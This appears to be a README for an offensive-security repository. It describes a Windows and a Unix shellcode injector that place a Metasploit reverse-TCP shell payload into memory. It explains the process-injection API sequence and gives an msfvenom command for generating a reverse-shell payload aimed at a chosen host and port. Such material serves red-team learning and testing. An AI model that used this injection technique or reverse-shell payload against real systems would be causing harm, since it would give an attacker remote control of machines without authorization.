# Shellcode

This is a program that provides two versions to perform shellcode injection and execution in memory. Shellcode is a sequence of machine code instructions, commonly used for exploitation or executing specific tasks.

## What is a shellcode:

A shellcode is a sequence of machine code instructions written to be directly executed by a specific program or vulnerability in the operating system. It is commonly used in vulnerability exploitation attacks to gain unauthorized access to the system, inject malicious code, execute commands, or open doors for future malicious actions.

<div>
<img src="images/shellcode.png"/>
</div>

## Functionality of both versions:

1. **Windows Version (procinj.cpp):**

   This version of the program is designed for Windows operating systems and uses Windows API functions to inject shellcode into a remote process. It follows these steps:

   a. Obtains a handle to the target process using the `OpenProcess` function.
   b. Allocates executable memory in the target process's memory space using `VirtualAllocEx`.
   c. Copies the shellcode to the allocated memory using `WriteProcessMemory`.
   d. Creates a remote thread in the target process to start executing the shellcode using `CreateRemoteThread`.

2. **Unix-like Systems Version (unix_procinj.c):**

   This version of the program is designed for Unix-like systems, such as Linux, and uses `mmap` and `mprotect` functions to perform shellcode injection into an allocated memory segment. The steps include:

   a. Allocates a memory segment with read, write, and execute permissions using `mmap`.
   b. Copies the shellcode to the allocated memory using `memcpy`.
   c. Configures memory permissions to allow only execution of the shellcode using `mprotect`.
   d. Converts the allocated memory address to a function pointer and executes it.

## Important Note:

The shellcode included in the code of both versions of this program is configured to connect to the IP address 127.0.0.1 on port 4444 using the Metasploit payload `windows/x64/shell_reverse_tcp`. It is essential to emphasize that this IP address and port are examples only and should not be used for malicious purposes. If you wish to use this tool for legitimate purposes, you must modify the shellcode and configure it to connect to a server and port of your ownership or duly authorized.

To generate a new custom shellcode for your specific use case, you can use the Metasploit tool with the `msfvenom` command, adjusting the LHOST and LPORT parameters to your desired IP address and port:

```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip_address> LPORT=<your_port> -f c
```
